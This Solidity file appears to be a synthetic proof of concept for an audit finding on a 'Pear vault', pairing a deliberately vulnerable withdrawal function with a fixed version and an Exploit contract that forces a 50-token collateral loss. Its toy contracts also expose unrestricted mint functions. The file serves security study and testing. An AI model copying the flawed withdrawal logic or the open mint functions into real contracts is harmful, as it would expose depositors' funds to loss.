// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Pear vault — a withdrawal larger than liquid cash closes the position
    (Shieldify, Pear vault, November 2025).
    SYNTHETIC, cheatcode-free, one block.
    Liquid cash is 50 ASSET. The position holds 200 of collateral.
    The caller owns 400 of 1,000 shares, worth 100 ASSET, which is more
    than the liquid cash. requestWithdrawal closes the position at a 25%
    haircut. The position loses N = 50. Control pays only the liquid 50
    and leaves the position at 200. */

contract Asset {
    string public constant name = "ASSET";
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PearVault {
    Asset public asset;
    uint256 public liquid = 50 ether;
    uint256 public position = 200 ether;
    uint256 public loss;
    uint256 public totalShares = 1000 ether;
    mapping(address => uint256) public balanceOf;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function mintShares(address to, uint256 amount) external {
        balanceOf[to] = amount;
    }

    function requestWithdrawal(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "shares");
        uint256 assets = shares * (liquid + position) / totalShares;
        if (assets > liquid) {
            uint256 received = position * 75 / 100;
            // @> VULN: the withdrawal closes the position and the haircut is lost collateral
            loss = position - received;
            position = 0;
            liquid += received;
            asset.mint(address(this), received);
        }
        uint256 pay = assets;
        liquid -= pay;
        asset.transfer(msg.sender, pay);
        balanceOf[msg.sender] -= shares;
    }
}

contract PearVaultFixed {
    Asset public asset;
    uint256 public liquid = 50 ether;
    uint256 public position = 200 ether;
    uint256 public loss;
    uint256 public totalShares = 1000 ether;
    mapping(address => uint256) public balanceOf;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function mintShares(address to, uint256 amount) external {
        balanceOf[to] = amount;
    }

    function requestWithdrawal(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "shares");
        uint256 assets = shares * (liquid + position) / totalShares;
        uint256 pay = assets < liquid ? assets : liquid;
        liquid -= pay;
        asset.transfer(msg.sender, pay);
        balanceOf[msg.sender] -= shares;
    }
}

contract Exploit {
    Asset public asset;
    PearVault public vault;
    uint256 public paid;
    uint256 public lost;

    constructor() {
        asset = new Asset();
        vault = new PearVault(asset);
    }

    function run() external {
        asset.mint(address(vault), 50 ether);
        vault.mintShares(address(this), 400 ether);
        vault.requestWithdrawal(400 ether);
        paid = asset.balanceOf(address(this));
        lost = vault.loss();
        require(lost == 50 ether, "loss");
        require(vault.position() == 0, "closed");
        require(paid == 100 ether, "paid");
    }
}
